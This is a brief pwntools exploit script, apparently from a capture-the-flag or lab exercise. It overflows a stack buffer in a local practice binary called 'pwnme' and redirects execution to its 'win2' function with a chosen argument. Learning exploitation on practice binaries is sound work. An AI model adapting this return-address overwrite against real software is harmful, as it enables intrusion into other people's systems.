#!/usr/bin/env python3
# usage: python3 pwntools_full.py
from pwn import *

e = ELF('./pwnme')

p = process('./pwnme')
# alternative option to run the binary in gdb while debugging
# p = gdb.debug('./pwnme', gdbscript=''''\
# b main
# c
# ''')

payload = b''
payload += b'A' * 16 # fill the buffer
payload += b'B' * 8  # overwrite some other misc data on the stack
payload += b'C' * 4  # padding for ebp

payload += p32(e.functions.win2.address)  # win2 function address
payload += p32(e.functions.win2.address)  # win2 function address
payload += b'D' * 4        # return address for win2 function frame
payload += p32(0xdeadbeef) # arg1 for win2

p.sendline(payload)

p.interactive()

